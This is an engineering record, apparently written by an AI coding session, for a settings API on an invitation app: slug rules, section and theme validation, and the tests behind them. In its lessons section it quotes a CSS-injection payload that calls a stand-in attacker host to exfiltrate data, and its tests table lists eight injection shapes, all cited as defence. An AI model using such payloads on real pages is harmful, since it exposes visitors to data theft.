# P1-14 — Settings sub-resource and slug rules

| | |
|---|---|
| **Date** | 2026-09-12 |
| **Task** | `TASKS/PHASE-1-AUTH-AND-INVITATION-CORE.md` § P1-14 |
| **Phase** | Phase 1 |
| **Surface** | backend |
| **Author** | Claude Code session |
| **Commits / PR** | `feat/P1-14-settings-slug` |
| **Status** | Completed |
| **Spec** | Written into this record |

---

## What Changed

`GET`/`PATCH /invitations/:id/settings` — the toggles, `theme_override`, and the slug, as
one domain object over two tables. Section keys and theme keys are validated against the
invitation's **own** template version, and BR-6.2's post-publish slug rules are enforced.

Along the way, a control the card did not ask for and the product needed: **`theme_override`
values are validated, not only its keys.**

## Why

`docs/API/04` § Settings, BR-6, and `docs/PLAN/08` § Where Settings Fields Physically Live
(ADR-022).

The theme of the card is that *a boundary that does not reject is not a boundary*. Storing
a section key the template does not define, or a theme key outside
`customizable_theme_keys`, produces the failure that looks like success: the API returns
200, the page does not change, and nothing anywhere says why.

## How

**One screen, two tables.** `slug` is a column on `invitations` because it is on the public
request path (`WHERE slug = ? AND status = 'published'`); the toggles live on
`invitation_settings` because they are read and changed together. The service writes to
whichever owns the column — `docs/PLAN/08`: "users should not have to know the schema to
change a setting."

**Validation reads the invitation's locked template version, not the template's newest.**
BR-3.1 locks a version at creation; settings validation has to use *that* one, or an admin
publishing a template that drops a section would start rejecting saves on invitations that
legitimately still have it. There is a test that seeds a newer version and asserts both
directions.

**A missing `configurable` means NOT configurable.** `docs/PLAN/07` writes
`configurable: true` explicitly for a toggleable section, so defaulting the other way would
make every section in a template that omits the flag switchable off — including a hero,
which is a blank invitation.

**Theme keys are compared exactly, never by prefix.** `colors` permitted does not grant
`colors.primary`, and vice versa. A prefix match would quietly widen every template's
boundary the first time somebody nested a value.

**`published_at IS NULL`, not `status != 'published'`, decides whether a slug change needs
confirmation.** BR-6.2's reason is that *old links break*, and unpublishing does not
un-share the links people already hold. An invitation that was published and then
unpublished still needs the confirmation.

**A concurrent slug claim is a 409.** The availability check and the write are not atomic,
so `updateSlug` catches Postgres `23505` and reports "not written" rather than letting a
unique violation escape as a 500. `docs/BACKEND/06` § Slug Validation asks for exactly that.

## Files and Components Touched

| Path | Change |
|---|---|
| `backend/api/src/modules/invitation/settings.service.ts` | **New** — including `assertThemeKeysValid`, `assertThemeValuesSafe`, `parseSections` |
| `backend/api/src/shared/tenancy/invitation-repository.ts` | `findOwnedSettings`, `updateSettings`, `updateSlug`, `findTemplateVersionFor`, `isUniqueViolation` |
| `backend/api/src/modules/invitation/slug.service.ts` | `check` takes an `excludeInvitationId` |
| `backend/api/src/shared/rate-limit/policies.ts` | `slug-change`, 3/day per user |
| `packages/schema/src/index.ts` | `HEX_COLOR` and `CSS_TOKEN` exported |
| `backend/api/src/shared/sanitizer/registry.ts` | `enabled_sections` and `theme_override` registered as non-prose |
| `backend/api/test/integration/settings.itest.ts` | **New** — 46 tests |
| `backend/api/test/invitation-http.spec.ts` | 16 tests added, plus a `beforeEach` fixing a leaked stub |

No migration.

## Decisions Made

| Decision | Rationale |
|---|---|
| **Theme override *values* are validated**, reusing `@wi/schema`'s `HEX_COLOR` and `CSS_TOKEN` | A value becomes a CSS custom property on a public page, and an override — unlike a template definition — comes from an end user. See below |
| The regexes are imported, not re-derived | The template definition and the user override must not disagree about what a legal theme value is |
| Exact key comparison, no prefix matching | A prefix match widens every template's boundary silently |
| `configurable` absent means not configurable | `docs/PLAN/07` writes `true` explicitly; the other default makes a hero switchable off |
| A duplicate section key is rejected | Keeps the stored array a set, which every reader assumes it is |
| `published_at`, not `status`, gates the slug confirmation | Unpublishing does not un-share links |
| `slug-change` is a new rate-limit policy at 3/day | BR-6.2 asks for a limit and names no number; adding it to the policy table keeps it tunable |
| The limiter guards every settings save, not only slug changes | A guard cannot read the parsed body; 3/day is chosen with that in mind |

## Deviations from `docs/`

None. `slug-change` is an addition to `docs/SECURITY/10`'s table rather than a change to it
— the document predates BR-6.2 needing a number — and it is declared in `policies.ts` with
that noted, the same way `reset-password` was in `P1-07`.

## Tests Added

62 (46 integration, 16 HTTP). API integration 556 → 602; unit 410 → 426.

| Group | Cases |
|---|---|
| Read and write | the seven-key domain object; toggles written; partial; **writes land in whichever table owns the column** |
| **`enabled_sections`** | an undefined key is rejected; **nothing is stored when it is**; **a non-configurable section cannot be disabled**; a configurable one can; a duplicate is rejected; `parseSections` defaults `configurable` to false and ignores malformed entries |
| **`theme_override` keys** | a permitted key accepted; one outside the boundary rejected; **a parent key does not grant a child, in both directions**; nothing stored on rejection |
| **`theme_override` values** | **eight injections rejected** — `red; background: url(...)`, `url()`, a closing brace, `expression()`, a semicolon, a backslash escape, `var()`, a space-separated pair; five legitimate values accepted; a non-string rejected; a font key accepts spaces but still rejects a declaration; **an array is rejected rather than flattened into an index key** |
| **The slug** | free before first publish; **confirmation required after**; proceeds with it; **an unpublished-but-once-published invitation still needs it**; setting the same slug is a no-op; a taken slug is 409; **a concurrent claim is 409, not 500**; malformed rejected; blocklisted rejected |
| IDOR | read and write refused; **a foreign scope cannot claim my slug, and it stays null**; three repository methods refuse a foreign scope; a soft-deleted invitation refuses everything |
| **The locked version** | `gallery` exists only on the locked version and is still accepted; `colors.accent` is customizable only on the newer one and is refused |
| HTTP | read and write; **snake_case maps to camelCase for all eight fields**; **five lifecycle fields rejected**; six shape rejections; rate limited on `slug-change`; 404; 401 |

## Security Verification

| Control | Requirement | How it was verified |
|---|---|---|
| A section key the template does not define is rejected | Card DoD 1 | Two tests, one asserting nothing was stored. **Mutation**: emptying the unknown-key filter fails 2 tests |
| A non-configurable section cannot be disabled | Card DoD 2 | `"a non-configurable section cannot be disabled"` (422 `SECTION_NOT_CONFIGURABLE`), and the positive case so it is not passing by refusing everything |
| A theme override outside the boundary is rejected | Card DoD 3 | Three tests including both prefix directions |
| **A theme value cannot inject CSS** | `docs/SECURITY/08` | Eight rejection cases. **Mutation**: removing `assertThemeValuesSafe` fails **11** tests. Not asked for by the card — see below |
| Post-publish slug change needs confirmation and is limited | Card DoD 4 | Three tests plus the once-published case. **Mutation**: removing the confirmation guard fails 2 |
| A concurrent slug claim is 409 | Card DoD 5 | Two parallel saves for the same slug; exactly one rejects, with status 409 |
| Settings cannot move a lifecycle field | `docs/SECURITY/05` § 3 | Five HTTP rejections — `status`, `owner_id`, `template_version_id`, `expiry_date`, `published_at` |
| Cross-tenant settings access | `docs/SECURITY/05` § 1 | Two service tests, three repository-level ones |

## Abuse Cases Covered

CSS injection through a theme value (eight shapes), disabling a structural section, storing
an unknown section key, claiming another tenant's slug, smuggling a lifecycle field through
the settings screen, and churning slugs to squat addresses (rate limited).

## DoD Verification

- [x] A `section_key` the template does not define is rejected. And nothing is stored.
- [x] A non-configurable section cannot be disabled.
- [x] A theme override outside `customizable_theme_keys` is rejected. **Plus its values**, which the card did not ask for.
- [x] Post-publish slug change requires confirmation and is rate limited. `slug-change`, 3/day per user, added to the policy table.
- [x] A concurrent slug claim yields 409, not a 500. `23505` is caught by code, not by message.

## What Did Not Work

**1. `theme_override` had validated keys and unvalidated values, and the build guard is what
surfaced it.** `check-sanitized-fields` refused the field as unregistered. Writing the
exemption reason forced the question "what *is* the defence here, then?" — and the answer
was that the keys were checked and the values were `z.unknown()`. A theme value becomes a
CSS custom property on the public page, so `red; background: url(https://evil.test/?c=…)`
would have been a CSS injection reaching every guest.

That is `P1-16`'s design working as intended: the guard's real value is not catching
unsanitized prose, it is **making somebody state what protects each field**, where a missing
answer becomes visible.

The fix reuses `HEX_COLOR` and `CSS_TOKEN` from `@wi/schema` rather than writing new
patterns, so a user's override is held to exactly what a template definition is held to.

**2. A leaked test stub broke thirteen tests that had nothing to do with it.** `P1-09`'s
rate-limit test set the shared `limiterStub` to refuse and never restored it; it was the
last test in the file, so nothing noticed. Adding tests after it produced thirteen 429s.
Fixed with a `beforeEach` reset rather than a restore inside that one test, so the next
person to add a refusing case cannot reintroduce it.

## Follow-Ups and Open Questions

- **The limiter guards every settings save, not only slug changes.** A guard runs before the
  handler parses the body, so it cannot know whether a slug is in it. Three a day is chosen
  for that reason; if it proves annoying, the limiter could move into the service's slug
  branch, which costs the "reject before doing work" property.
- **`theme_override` values are validated but not *typed* per key.** `colors.primary`
  accepts `rounded` today, because the check is "hex colour or safe token" rather than "hex
  colour, because this key is a colour". Tightening it needs the theme schema's per-key
  shape, which `@wi/schema` has — worth doing if `P2-05`'s live preview surfaces confusion.
- **`P1-15` is next and must not delete data.** Its DoD says "no delete statement runs
  anywhere in this code path", and `enabled_sections` is the field it recomputes.

## What to Watch

**The two validations both read `findTemplateVersionFor`.** If anything ever changes that to
resolve the template's *newest* version rather than the invitation's locked one, settings
saves start failing on old invitations for reasons nobody will connect to a template
publish. The test named `"not the template's newest version"` is what stands there.

**`assertThemeValuesSafe` is the newest control here and the least obviously necessary.** It
looks like over-validation until you remember the value ends up inside a `style` attribute
on a page hundreds of guests open. Eleven tests fail without it.
